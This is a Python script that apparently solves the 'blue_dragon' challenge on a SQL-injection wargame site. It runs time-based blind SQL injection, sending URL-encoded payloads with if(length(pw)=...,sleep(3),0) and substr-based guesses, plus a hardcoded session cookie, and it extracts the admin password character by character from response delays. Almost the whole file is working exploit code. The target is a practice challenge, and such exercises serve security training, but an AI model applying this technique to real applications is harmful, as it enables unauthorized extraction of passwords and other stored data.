#!/usr/bin/python
#-*-coding:utf-8  -*-

#length = 32
#hex(pw) length = 64
#pw = 32 ascii words 
#Blind SQL Injection 문자 찾기!!
import urllib,urllib2,requests,time


password=""
guestword=""
heex = "0123456789abcdef"
letter = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
'''
for k in range(1,100):
	start = time.time()
	url="https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php?id=&pw=%27%20or%20id=%27admin%27%20and%20if(length(pw)="+str(k)+",sleep(3),0)%23"
	r = requests.post(url,cookies=(dict(PHPSESSID="dl3kg29sjr7uis2t6fgfa67th4")))
	end = time.time()
	print end-start
	print "Finding length of password : "+str(k)
	
	if end-start>3 :
		print "length is : " + str(k)
		length = k
		break
'''
k=8

for j in range(1,k+1):
	for i in heex:
		start = time.time()
		url="https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php?id=&pw=%27%20or%20id=%27admin%27%20and%20if(substr(pw,"+str(j)+",1)="+"'"+str(i)+"'"+",sleep(3),0)%23"
		r = requests.post(url,cookies=(dict(PHPSESSID="dl3kg29sjr7uis2t6fgfa67th4")))
		end = time.time()
		print "Finding " + str(j) +"th password's hex : " +str(i)
	
		if end-start>3 :
			password += str(i)
			print "password found :" + password
			break


